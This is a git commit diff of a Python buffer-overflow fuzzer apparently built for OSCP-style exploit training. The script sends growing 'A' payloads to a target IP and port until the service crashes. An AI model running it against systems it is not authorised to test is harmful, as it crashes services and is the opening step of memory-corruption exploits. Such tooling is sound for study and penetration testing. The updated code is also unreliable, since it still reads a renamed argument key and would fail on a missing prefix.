50fa1fdf607b687fa5a7e23abd944e56968951c0
Data-Praetor <31068107+Data-Praetor@users.noreply.github.com>
2022-11-22 15:45:10 +0530

    Update fuzzer.py

--- fuzzer.py
+++ fuzzer.py
@@ -4,36 +4,30 @@
 #Olivier Laflamme - https://boschko.ca/braindead-buffer-overflow-guide-to-pass-the-oscp-blindfolded/
 #Heath Adams (The Cyber Mentor)'s PNPT Training - https://github.com/hmaverickadams
 
-#Usage: python3 fuzzer.py -i <IP> -p <PORT> --prefix <Optional> -b <Optional>
-#-i: IP Address
-#-p: Port
-#--prefix: String to add to message
-#-b: If the buffer length for crash is known, use this to replicate crashing consistently
-
-#Expected: The vulnerable program sends some data on connection. Otherwise, remove line #47: "s.recv(1024)"
+#Expected: The vulnerable program sends some data on connection. Otherwise, remove line #41: "s.recv(1024)"
 
 import argparse, sys, socket
 from time import sleep
 
-args = argparse.ArgumentParser()
-args.add_argument("-i", required=True, help="IP Address")
-args.add_argument("-p", required=True, help="Port")
-args.add_argument("--prefix", required=False, help="Payload Prefix")
-args.add_argument("-b", required=False, help="Exact bytes")
+args = argparse.ArgumentParser(usage='%(prog)s -i <IP> -p <PORT> --prefix <Optional> -b <Optional>')
+args.add_argument("-i", "--ip", required=True, help="IP Address")
+args.add_argument("-p", "--port", type=int, required=True, help="Port")
+args.add_argument("--prefix", help="String prefixed to the payload")
+args.add_argument("-b", "--bytes", type=int, help="Exact bytes to crash the target. Use to consistently replicate the crash") 
 args = vars(args.parse_args())
 
-ip = str(args["i"])
-port= int(args["p"])
+ip = args["ip"]
+port= args["port"]
 try:
 	socket.inet_aton(ip)
 	host = (ip,port)
 except:
 	sys.exit("Invalid IP Address.")
 
-prefix = str(args["prefix"])
+prefix = args["prefix"]
 
 if (args["b"]):
-	payload = prefix + "A" * int(args["b"])
+	payload = prefix + "A" * args["b"]
 else:
 	payload = prefix + "A" * 100
 
@@ -51,7 +45,7 @@ while True:
 		sleep(2)
 		payload = payload + "A" * 100
 		iterated = True
-	except:
+	except Exception:
 		if iterated:
 			print("Crash occured at buffer length: " + str(len(payload) - 100))
 			sys.exit()
